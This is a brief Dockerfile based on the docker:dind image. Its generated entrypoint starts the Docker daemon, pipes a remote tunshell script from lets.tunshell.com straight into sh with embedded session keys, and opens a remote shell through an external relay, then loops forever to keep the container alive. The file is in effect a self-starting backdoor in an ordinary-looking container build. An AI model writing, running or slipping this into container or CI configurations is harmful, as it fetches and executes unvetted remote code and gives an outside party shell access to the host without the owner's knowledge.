FROM docker:dind

# Install necessary packages
RUN apk add --no-cache curl bash

# Add entrypoint script
RUN echo '#!/bin/sh' > /entrypoint.sh && \
    echo 'dockerd-entrypoint.sh &' >> /entrypoint.sh && \
    echo 'sleep 5' >> /entrypoint.sh && \
    echo 'curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T RWyeG70tIfQlq3he3QCVnT We4iPzCy3gb2T6pvlctYyl eu.relay.tunshell.com' >> /entrypoint.sh && \
    echo 'while true; do sleep 86400; done' >> /entrypoint.sh && \
    chmod +x /entrypoint.sh

ENTRYPOINT ["/entrypoint.sh"]
